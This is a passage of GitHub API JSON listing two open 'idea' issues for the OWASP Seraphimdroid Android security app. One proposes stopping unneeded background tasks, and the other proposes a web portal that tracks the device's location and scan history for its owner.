    "labels_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/12/labels{/name}"],
    "comments_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/12/comments"],
    "events_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/12/events"],
    "html_url": ["https://github.com/nikolamilosevic86/owasp-seraphimdroid/issues/12"],
    "id": [57952701],
    "node_id": ["MDU6SXNzdWU1Nzk1MjcwMQ=="],
    "number": [12],
    "title": ["Stop unneeded tasks"],
    "user": {
      "login": ["nikolamilosevic86"],
      "id": [5192295],
      "node_id": ["MDQ6VXNlcjUxOTIyOTU="],
      "avatar_url": ["https://avatars0.githubusercontent.com/u/5192295?v=4"],
      "gravatar_id": [""],
      "url": ["https://api.github.com/users/nikolamilosevic86"],
      "html_url": ["https://github.com/nikolamilosevic86"],
      "followers_url": ["https://api.github.com/users/nikolamilosevic86/followers"],
      "following_url": ["https://api.github.com/users/nikolamilosevic86/following{/other_user}"],
      "gists_url": ["https://api.github.com/users/nikolamilosevic86/gists{/gist_id}"],
      "starred_url": ["https://api.github.com/users/nikolamilosevic86/starred{/owner}{/repo}"],
      "subscriptions_url": ["https://api.github.com/users/nikolamilosevic86/subscriptions"],
      "organizations_url": ["https://api.github.com/users/nikolamilosevic86/orgs"],
      "repos_url": ["https://api.github.com/users/nikolamilosevic86/repos"],
      "events_url": ["https://api.github.com/users/nikolamilosevic86/events{/privacy}"],
      "received_events_url": ["https://api.github.com/users/nikolamilosevic86/received_events"],
      "type": ["User"],
      "site_admin": [false]
    },
    "labels": [
      {
        "id": [274419494],
        "node_id": ["MDU6TGFiZWwyNzQ0MTk0OTQ="],
        "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/labels/idea"],
        "name": ["idea"],
        "color": ["bfe5bf"],
        "default": [false]
      }
    ],
    "state": ["open"],
    "locked": [false],
    "assignee": {},
    "assignees": [],
    "milestone": {},
    "comments": [0],
    "created_at": ["2015-02-17T17:15:33Z"],
    "updated_at": ["2015-10-17T21:31:41Z"],
    "closed_at": {},
    "author_association": ["OWNER"],
    "body": ["This is feature that should stop unnecessary running activities in the background. However, not services.\n\nVery low priority\n"]
  },
  {
    "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/11"],
    "repository_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid"],
    "labels_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/11/labels{/name}"],
    "comments_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/11/comments"],
    "events_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/11/events"],
    "html_url": ["https://github.com/nikolamilosevic86/owasp-seraphimdroid/issues/11"],
    "id": [57952288],
    "node_id": ["MDU6SXNzdWU1Nzk1MjI4OA=="],
    "number": [11],
    "title": ["Portal that collects data about location of the device"],
    "user": {
      "login": ["nikolamilosevic86"],
      "id": [5192295],
      "node_id": ["MDQ6VXNlcjUxOTIyOTU="],
      "avatar_url": ["https://avatars0.githubusercontent.com/u/5192295?v=4"],
      "gravatar_id": [""],
      "url": ["https://api.github.com/users/nikolamilosevic86"],
      "html_url": ["https://github.com/nikolamilosevic86"],
      "followers_url": ["https://api.github.com/users/nikolamilosevic86/followers"],
      "following_url": ["https://api.github.com/users/nikolamilosevic86/following{/other_user}"],
      "gists_url": ["https://api.github.com/users/nikolamilosevic86/gists{/gist_id}"],
      "starred_url": ["https://api.github.com/users/nikolamilosevic86/starred{/owner}{/repo}"],
      "subscriptions_url": ["https://api.github.com/users/nikolamilosevic86/subscriptions"],
      "organizations_url": ["https://api.github.com/users/nikolamilosevic86/orgs"],
      "repos_url": ["https://api.github.com/users/nikolamilosevic86/repos"],
      "events_url": ["https://api.github.com/users/nikolamilosevic86/events{/privacy}"],
      "received_events_url": ["https://api.github.com/users/nikolamilosevic86/received_events"],
      "type": ["User"],
      "site_admin": [false]
    },
    "labels": [
      {
        "id": [274419494],
        "node_id": ["MDU6TGFiZWwyNzQ0MTk0OTQ="],
        "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/labels/idea"],
        "name": ["idea"],
        "color": ["bfe5bf"],
        "default": [false]
      }
    ],
    "state": ["open"],
    "locked": [false],
    "assignee": {},
    "assignees": [],
    "milestone": {},
    "comments": [0],
    "created_at": ["2015-02-17T17:12:42Z"],
    "updated_at": ["2015-10-17T21:31:53Z"],
    "closed_at": {},
    "author_association": ["OWNER"],
    "body": ["Should be web based portal where users can register and login (for start lets make it on openshift free cloud)\nThe portal shoud:\n- Collect periodically location of the device\n- Data about scans\n- Be able to show history of these\n- Low Battery – If the device hits critical battery level, its current location is sent to the portal\n- User friendly interface integrated with database and google maps to show the last recorded position of the device, last scans and history of device movement and scans.\n"]
  }
]
